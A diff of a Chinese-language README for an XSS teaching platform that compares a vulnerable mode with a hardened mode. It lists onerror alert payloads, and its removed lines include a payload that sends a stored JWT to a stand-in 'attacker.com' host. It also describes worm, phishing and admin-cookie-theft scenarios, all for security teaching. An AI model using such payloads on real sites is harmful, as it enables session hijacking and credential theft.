@@ -10,35 +10,38 @@
 
 ## 项目简介
 
+一个专为 Web 安全教学设计的 XSS 漏洞演示平台，通过 **VULN ↔ SECURE 双模式**对比攻击与防御效果。
+
+**技术栈**：
 - 前端：Vue 3 + Element Plus + Vite
 - 后端：Spring Boot 3 + JPA + MySQL 8
 - 认证：JWT (HS256)
-- 特性：支持 VULN ↔ SECURE 双态切换（对比攻击与防御效果）
 
-架构：前后端分离，RESTful API，数据库初始化由 Spring 自动完成（首启自动建表与灌数据）。
+**核心特性**：
+- ✅ 5 个渐进式 XSS 攻击场景（从简单弹窗到蠕虫传播）
+- ✅ 双模式一键切换（无需重启）
+- ✅ 完整攻防对比（JWT 存储、内容过滤、安全响应头）
 
 ## 快速开始
 
-前置要求：Node.js 20+、JDK 21、MySQL 8.0、Maven 3.9+。
+### 本地运行
 
-1) 启动 MySQL（root/root）
+**前置要求**：Node.js 20+、JDK 21、MySQL 8.0、Maven 3.9+
 
-2) 启动后端
-```
+```bash
+# 1. 启动 MySQL（root/root）
+
+# 2. 启动后端
 cd apps/backend
 mvn spring-boot:run
-```
-访问 `http://localhost:8080`
+# 访问 http://localhost:8080
 
-3) 启动前端
-```
+# 3. 启动前端（新终端）
 cd apps/frontend
 npm install
 npm run dev
+# 访问 http://localhost:5173
 ```
-访问 `http://localhost:5173`
-
-4) 登录验证（见下方测试账号）
 
 ### Docker 一键部署
 ```
@@ -47,71 +50,90 @@ docker-compose up -d
 ```
 访问 `http://localhost`
 
-## 模式切换（VULN / SECURE）
+## 模式切换
 
-- 页面左上角徽章点击切换（推荐）。切换会自动登出，重新登录即可。
-- 或修改配置并重启：
-  - 后端 `apps/backend/src/main/resources/application.yml`: `xss.mode: vuln|secure`
-  - 前端 `apps/frontend/.env`: `VITE_XSS_MODE=vuln|secure`
+### 方式 1：页面切换（推荐）
+点击页面左上角徽章：
+- 🔴 VULN 模式（红色）→ 点击切换
+- 🟢 SECURE 模式（绿色）→ 点击切换
 
-对比要点：
-- VULN：JWT 存 localStorage；输入直接渲染；无安全响应头；XSS 可成功
-- SECURE：JWT 为 HttpOnly Cookie；后端转义 + DOMPurify；CSP + X-Frame-Options + X-XSS-Protection；XSS 被拦截
+切换后会自动登出，重新登录即可生效。
+
+### 方式 2：配置文件
+修改配置后需重启服务：
+- 后端：`apps/backend/src/main/resources/application.yml` → `xss.mode: vuln|secure`
+- 前端：`apps/frontend/.env` → `VITE_XSS_MODE=vuln|secure`
+
+### 模式差异对比
+
+| 项目 | VULN 模式 | SECURE 模式 |
+|------|----------|-------------|
+| **JWT 存储** | localStorage（可被 JS 读取） | HttpOnly Cookie（JS 无法访问） |
+| **内容渲染** | v-html 直接渲染 | DOMPurify 白名单过滤 |
+| **后端输出** | 不转义 | HtmlUtils.htmlEscape() |
+| **安全响应头** | 无 | CSP + X-Frame-Options |
+| **XSS 攻击** | ✅ 成功执行 | ❌ 被拦截 |
 
 ## 测试账号
 
-- admin / Admin#2025（管理员，用于 L3 后台查看）
-- attacker / Attacker#2025（用于 L2 恶意 Bio）
-- alice / Admin#2025（普通用户）
+| 用户名 | 密码 | 角色 | 用途 |
+|--------|------|------|------|
+| admin | Admin#2025 | 管理员 | 场景 5（盲 XSS） |
+| attacker | Attacker#2025 | 普通用户 | 场景 4（Bio 社工） |
+| alice | Admin#2025 | 普通用户 | 场景 3（评论蠕虫） |
 
-## 场景速览（L0~L4）
+## 演示场景
 
-| 场景 | 类型 | 目标 | 入口 |
-|------|------|------|------|
-| L0 | 反射型 | 代码执行 | 搜索 URL 参数 |
-| L1 | 反射型 | 窃取 JWT | 搜索 + localStorage |
-| L2 | 存储型 | 伪装登录钓鱼 | 用户 Bio |
-| L3 | 盲 XSS | 管理员凭证窃取 | 反馈 → 后台查看 |
-| L4 | 存储型 | 文章评论 XSS | 评论 → 所有访客 |
+### 场景 1：反射型 XSS「Hello, XSS」
+**目标**：确认 XSS 能执行  
+**入口**：`/search?q=...`  
+**Payload**：`<img src=x onerror=alert(1)>`  
+**预期**：弹窗显示 `1`
 
-详细步骤与对比见：`XSS演示场景说明.md`
+### 场景 2：静默画像收集
+**目标**：无感窃取 JWT 凭证  
+**入口**：`/search?q=...`  
+**特点**：不弹窗，静默上报到攻击者服务器  
+**预期**：收集器记录 `{hasToken:true, profile:true}`
 
-### 快速体验（示例）
-- L0：`/search?q=<img src=x onerror=alert('XSS')>`
-- L1：登录后：`/search?q=<img src=x onerror="fetch('https://attacker.com/log?jwt='+localStorage.getItem('accessToken'))">`
-- L2：访问 `/profile/attacker` 观察伪装登录框
-- L3：提交 `/feedback` 后，用 admin 在 `/admin/feedbacks` 打开详情
-- L4：登录后在文章详情页发表评论 `<img src=x onerror=alert('评论XSS')>`
+### 场景 3：评论蠕虫 ⭐
+**目标**：展示存储型 XSS 自传播能力  
+**入口**：文章详情页评论区  
+**特点**：
+- 自动扩散到其他文章
+- localStorage 防重复
+- 目标数上限（3 个）保证可控  
+**预期**：评论自动传播到 3 篇文章
 
-💡 **注意**：Vue 中通过 v-html 插入的 `<script>` 标签不会执行，需使用事件处理器型 payload（如 onerror、onload）。
+### 场景 4：Bio 伪造登录页
+**目标**：全屏伪造登录界面钓鱼  
+**入口**：`/profile/{username}` 个人简介  
+**特点**：“会话已过期”提示，诱骗输入账号密码  
+**预期**：用户输入后攻击者获取凭证
+
+### 场景 5：盲 XSS 窃取管理员身份
+**目标**：利用管理员会话窃取凭证  
+**入口**：前台 `/feedback` → 后台 `/admin/feedbacks` 查看  
+**特点**：管理员无感知  
+**预期**：攻击者获取管理员 username、role、cookie
+
+📝 详细操作步骤见：[XSS演示场景说明.md](XSS演示场景说明.md)
+
+## 快速体验
+
+```bash
+# 场景 1：基础弹窗
+http://localhost:5173/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+# 场景 3-5：需按文档步骤操作
+```
+
+💡 **重要提示**：Vue 中通过 `v-html` 插入的 `<script>` 标签不会执行，需使用事件处理器型 payload（如 `onerror`、`onload`）。
 
 ## 技术栈
-
-**前端**：
-- Vue **3.5.13**
-- Vite **6.0.5**
-- Element Plus **2.9.1**
-- Pinia **2.3.0**
-- Axios **1.7.9**
-- DOMPurify **3.2.3**
-- Node **24 LTS**
-
-**后端**：
-- Spring Boot **3.5.1**
-- Spring Security **6.x**
-- JPA/Hibernate
-- JJWT **0.12.6**
-- MySQL **8.4 LTS**
-- JDK **21**
-- Maven **3.9+**
-
-**安全防御（SECURE模式）**：
-- HttpOnly + Secure + SameSite Cookie
-- 后端 HTML 转义（HtmlUtils.htmlEscape）
-- 前端白名单过滤（DOMPurify）
-- Content Security Policy (CSP)
-- X-Frame-Options (防点击劫持)
-- X-XSS-Protection (浏览器XSS过滤器)
+- 前端：Vue 3、Vite、Element Plus、Pinia、Axios
+- 后端：Spring Boot 3、Spring Security、JPA/Hibernate、MySQL 8
+- 安全：HttpOnly Cookie、后端转义、DOMPurify 白名单
 
 ## 参考
 - XSS 场景说明：`XSS演示场景说明.md`
